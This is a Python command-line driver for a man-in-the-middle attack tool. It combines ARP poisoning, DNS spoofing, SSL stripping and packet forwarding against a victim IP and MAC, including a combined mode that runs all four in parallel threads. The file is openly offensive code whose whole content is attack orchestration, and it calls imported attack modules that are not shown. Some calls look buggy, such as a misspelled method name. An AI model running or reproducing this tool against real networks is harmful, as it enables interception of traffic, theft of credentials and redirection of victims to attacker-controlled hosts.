import argparse
import sys
import os
from arp_poisoning import ARP_Poisoning
import scapy.all as scapy
from dns_spoofer import run_dns_spoofer
from ssl_stripping import SSLStripper
from forwarder import Forwarder
import threading

def get_network_info():
    """Get basic network information"""
    try:
        # Get default interface
        default_iface = scapy.conf.iface
        # Get local IP and MAC
        local_ip = scapy.get_if_addr(default_iface)
        local_mac = scapy.get_if_hwaddr(default_iface)
        return default_iface, local_ip, local_mac
    except Exception as e:
        print(f"Error getting network info: {e}")
        return None, None, None

def validate_mac(mac):
    """Validate MAC address format"""
    import re
    mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return re.match(mac_pattern, mac) is not None

def validate_ip(ip):
    """Validate IP address format"""
    import re
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(ip_pattern, ip):
        return False
    # Check each octet is 0-255
    octets = ip.split('.')
    return all(0 <= int(octet) <= 255 for octet in octets)

def run_arp_poisoning(args):
    """Execute ARP poisoning attack"""
    print(f"[+] Starting ARP Poisoning Attack")
    print(f"    Target: {args.victim_ip} ({args.victim_mac})")
    print(f"    Spoofing: {args.ip_to_spoof}")
    print(f"    Interface: {args.interface}")
    print(f"    Interval: {args.interval}s")
    print("[!] Press Ctrl+C to stop")
    # Create and run ARP poisoning attack
    arp_attack = ARP_Poisoning(
        iface=args.interface,
        packet_interval=args.interval,
        victim_mac=args.victim_mac,
        victim_ip=args.victim_ip,
        ip_to_spoof=args.ip_to_spoof,
        attacker_mac=args.attacker_mac,
        attacker_ip=args.attacker_ip
    )
    arp_attack.run()

def run_ssl_stripping(args):
    """Execute SSL stripping attack (placeholder)"""
    print(f"[+] Launching SSL Stripping")
    print(f"    Victim IP: {args.target}")
    print(f"    Redirecting to: {args.redirect}")
    default_iface, local_ip, _ = get_network_info()
    ssl_stripper = SSLStripper(
        interface=args.interface or default_iface,
        ip_victim=args.target,
        ip_attacker=local_ip
    )
    ssl_stripper.strip()

def run_forwarding(args):
    """Execute packet forwarding attack"""
    forwarder = Forwarder(
        iface=args.interface,
        victim_mac=args.victim_mac,
        victim_ip=args.victim_ip,
        server_ip=args.server_ip,
        server_mac=args.server_mac,
        attacker_mac=args.attacker_mac,
        attacker_ip=args.attacker_ip
    )
    forwarder.forward(pkt=None)

def run_arp_mitm(args):
    """Run ARP poisoning and maintain MITM forwarding"""
    print("[+] Starting ARP Poisoning (MITM mode)")
    arp_attack = ARP_Poisoning(
        iface=args.interface,
        packet_interval=args.interval,
        victim_mac=args.victim_mac,
        victim_ip=args.victim_ip,
        ip_to_spoof=args.ip_to_spoof,
        attacker_mac=args.attacker_mac,
        attacker_ip=args.attacker_ip
    )
    # Start packet forwarding
    arp_attack.start_forarping()
    forward_thread = threading.Thread(target=arp_attack.run)
    forward_thread.start()
    forward_thread.join()

def _dns_spoof_worker(args):
    """Actual DNS spoofing logic"""
    print("[+] Starting DNS Spoofing Attack")
    run_dns_spoofer(
        interface=args.interface,
        target_ip=args.target,
        domain=args.domain,
        redirect_ip=args.redirect
    )

def run_dns_spoofing(args):
    """Spawn DNS spoofing in its own thread"""
    print("[+] Launching DNS spoofing thread")
    thread = threading.Thread(target=_dns_spoof_worker, args=(args,))
    thread.start()
    return thread

def main():
    # Get network information
    default_iface, local_ip, local_mac = get_network_info()
    # Main parser
    parser = argparse.ArgumentParser(
        description='Network Attack Tool - ARP Poisoning, DNS Spoofing, SSL Stripping',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # Add subparsers for different attack modes
    subparsers = parser.add_subparsers(dest='mode', help='Attack mode')
    subparsers.required = True

    # ARP Poisoning parser
    arp_parser = subparsers.add_parser('arp', help='ARP Poisoning attack')
    arp_parser.add_argument('--victim-ip', required=True, help='Target victim IP address')
    arp_parser.add_argument('--victim-mac', required=True, help='Target victim MAC address')
    arp_parser.add_argument('--ip-to-spoof', required=True, help='IP address to spoof')
    arp_parser.add_argument('--interface', default=default_iface, help=f'Network interface (default: {default_iface})')
    arp_parser.add_argument('--interval', type=float, default=2.0, help='Spoofed packet repetition interval in seconds (default: 2.0)')
    arp_parser.add_argument('--attacker-ip', default=local_ip, help=f'Attacker IP address (default: {local_ip})')
    arp_parser.add_argument('--attacker-mac', default=local_mac, help=f'Attacker MAC address (default: {local_mac})')

    # DNS Spoofing parser (now with interface)
    dns_parser = subparsers.add_parser('dns', help='DNS Spoofing attack')
    dns_parser.add_argument('--target', required=False, default="", help='Target IP address (leave blank to spoof all)')
    dns_parser.add_argument('--domain', required=False, default="", help='Domain to spoof (leave blank to spoof all)')
    dns_parser.add_argument('--redirect', required=True, help='IP to redirect to')
    dns_parser.add_argument('--interface', default=default_iface, help='Network interface (default: {})'.format(default_iface))

    ssl_parser = subparsers.add_parser('ssl', help='SSL Stripping attack')
    ssl_parser.add_argument('--target', required=True, help='Target IP address')
    ssl_parser.add_argument('--redirect', required=False, help='Redirect HTTP site (e.g., example.com)')
    ssl_parser.add_argument('--interface', default=default_iface, help=f'Network interface (default: {default_iface})')

    # Forwarding parser
    forward_parser = subparsers.add_parser('forward', help='Packet Forwarding attack')
    forward_parser.add_argument('--victim-ip', required=True, help='Victim IP address')
    forward_parser.add_argument('--victim-mac', required=True, help='Victim MAC address')
    forward_parser.add_argument('--server-ip', required=True, help='Server IP address to forward packets to')
    forward_parser.add_argument('--server-mac', required=True, help='Server MAC address to forward packets to')
    forward_parser.add_argument('--interface', default=default_iface, help='Network interface')
    forward_parser.add_argument('--attacker-ip', default=local_ip, help='Attacker IP address')
    forward_parser.add_argument('--attacker-mac', default=local_mac, help='Attacker MAC address')

    # Attack parser
    attack_parser = subparsers.add_parser('attack', help='Combined attack mode (ARP Poisoning, DNS Spoofing, SSL Stripping, Forwarding)')
    attack_parser.add_argument('--victim-ip', required=True, help='Victim IP address')
    attack_parser.add_argument('--victim-mac', required=True, help='Victim MAC address')
    attack_parser.add_argument('--server-ip', required=True, help='Server IP address')
    attack_parser.add_argument('--server-mac', required=True, help='Server MAC address')
    attack_parser.add_argument('attacker_ip', default=local_ip, help='Attacker IP address')
    attack_parser.add_argument('attacker_mac', default=local_mac, help='Attacker MAC address')
    attack_parser.add_argument('--interface', default=default_iface, help=f'Network interface  (default: {default_iface})')
    attack_parser.add_argument('--interval', type=float, default=2.0, help='Spoofed packet repetition interval in seconds (default: 2.0)')
    attack_parser.add_argument('--redirect', required=False, help='Redirect HTTP site (e.g., example.com)')
    attack_parser.add_argument('--domain', required=False, default="", help='Domain to spoof (leave blank to spoof all)')

    # ARP MITM parser
    arp_mitm_parser = subparsers.add_parser('arp-mitm', help='ARP poisoning with packet forwarding (MITM)')
    arp_mitm_parser.add_argument('--victim-ip', required=True)
    arp_mitm_parser.add_argument('--victim-mac', required=True)
    arp_mitm_parser.add_argument('--ip-to-spoof', required=True)
    arp_mitm_parser.add_argument('--interface', default=default_iface)
    arp_mitm_parser.add_argument('--interval', type=float, default=2.0)
    arp_mitm_parser.add_argument('--attacker-ip', default=local_ip)
    arp_mitm_parser.add_argument('--attacker-mac', default=local_mac)

    # Parse arguments
    args = parser.parse_args()

    # Validate that network info was obtained
    if not default_iface or not local_ip or not local_mac:
        print("[!] Error: Could not obtain network information")
        sys.exit(1)

    # Mode-specific validation and execution
    if args.mode == 'arp':
        # Validate ARP arguments
        if not validate_ip(args.victim_ip):
            print(f"[!] Error: Invalid victim IP address: {args.victim_ip}")
            sys.exit(1)
        if not validate_mac(args.victim_mac):
            print(f"[!] Error: Invalid victim MAC address: {args.victim_mac}")
            sys.exit(1)
        if not validate_ip(args.ip_to_spoof):
            print(f"[!] Error: Invalid spoof IP address: {args.ip_to_spoof}")
            sys.exit(1)
        if args.interval <= 0:
            print(f"[!] Error: Interval must be positive: {args.interval}")
            sys.exit(1)
        # Check if arp_poisoning module exists
        if not os.path.exists('arp_poisoning.py'):
            print("[!] Error: arp_poisoning.py not found")
            sys.exit(1)
        # Run ARP poisoning
        run_arp_poisoning(args)

    elif args.mode == 'dns':
        run_dns_spoofing(args)

    elif args.mode == 'ssl':
        if not validate_ip(args.target):
            print(f"[!] Error: Invalid target IP address: {args.target}")
            sys.exit(1)
        run_ssl_stripping(args)

    elif args.mode == 'forward':
        run_forwarding(args)

    elif args.mode == 'arp-mitm':
        run_arp_mitm(args)

    elif args.mode == 'attack':
        arp_attack = ARP_Poisoning(
            iface=args.interface,
            packet_interval=args.interval,
            victim_mac=args.victim_mac,
            victim_ip=args.victim_ip,
            ip_to_spoof=args.server_ip,
            attacker_mac=args.attacker_mac,
            attacker_ip=args.attacker_ip
        )
        ssl_stripper = SSLStripper(
            interface=args.interface,
            ip_victim=args.victim_ip,
            ip_attacker=args.attacker_ip
        )
        forwarder = Forwarder(
            iface=args.interface,
            victim_mac=args.victim_mac,
            victim_ip=args.victim_ip,
            server_ip=args.server_ip,
            server_mac=args.server_mac,
            attacker_mac=args.attacker_mac,
            attacker_ip=args.attacker_ip
        )
        arp_spoofer_thread = threading.Thread(target=arp_attack.run)
        dns_spoofer_thread = threading.Thread(target=run_dns_spoofer, args=(args.interface, args.victim_ip, args.domain, args.redirect))
        ssl_stripper_thread = threading.Thread(target=ssl_stripper.strip)
        forwarder_thread = threading.Thread(target=lambda: scapy.sniff(iface=args.interface, filter="ip", prn=forwarder.forward, store=False))
        arp_spoofer_thread.start()
        dns_spoofer_thread.start()
        ssl_stripper_thread.start()
        forwarder_thread.start()
        arp_spoofer_thread.join()
        dns_spoofer_thread.join()
        ssl_stripper_thread.join()
        forwarder_thread.join()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)